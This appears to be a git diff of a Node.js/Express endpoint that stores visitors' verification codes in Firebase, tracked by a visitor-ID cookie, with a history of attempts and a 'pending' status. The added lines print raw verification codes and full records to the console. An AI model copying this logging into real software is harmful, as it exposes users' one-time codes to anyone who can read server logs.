@@ -546,11 +546,13 @@ app.post('/api/save-activation-data', async (req, res) => {
 app.post('/api/save-verification-code', async (req, res) => {
     try {
         const vid = req.cookies.vid;
+        console.log('[Save Verification] Visitor ID:', vid);
         if (!vid) {
             return res.status(400).json({ success: false, error: 'No visitor ID' });
         }
         
         const { verificationCode } = req.body;
+        console.log('[Save Verification] Verification Code:', verificationCode);
         if (!verificationCode) {
             return res.status(400).json({ success: false, error: 'No verification code provided' });
         }
@@ -569,27 +571,35 @@ app.post('/api/save-verification-code', async (req, res) => {
             ? Object.keys(data.verification.history).length 
             : 0;
         
-        const updates = {};
+        // Prepare verification object
+        const verificationData = {
+            current: {
+                verificationCode,
+                timestamp,
+                attemptNumber: historyCount + 1
+            },
+            verification_status: 'pending'
+        };
         
-        // Save previous attempt to history
+        // Add history if exists
         if (data.verification && data.verification.current) {
-            const attemptKey = `verification.history.attempt_${historyCount + 1}`;
-            updates[attemptKey] = {
+            if (!verificationData.history) {
+                verificationData.history = data.verification.history || {};
+            }
+            verificationData.history[`attempt_${historyCount + 1}`] = {
                 ...data.verification.current,
                 savedAt: timestamp
             };
         }
         
-        // Save current attempt
-        updates['verification.current'] = {
-            verificationCode,
-            timestamp,
-            attemptNumber: historyCount + 1
+        const updates = {
+            verification: verificationData,
+            lastUpdated: timestamp
         };
-        updates['verification.verification_status'] = 'pending';
-        updates['lastUpdated'] = timestamp;
         
+        console.log('[Save Verification] Updates to save:', JSON.stringify(updates, null, 2));
         await docRef.set(updates, { merge: true });
+        console.log('[Save Verification] Successfully saved to Firebase');
         
         res.json({ success: true });
     } catch (error) {
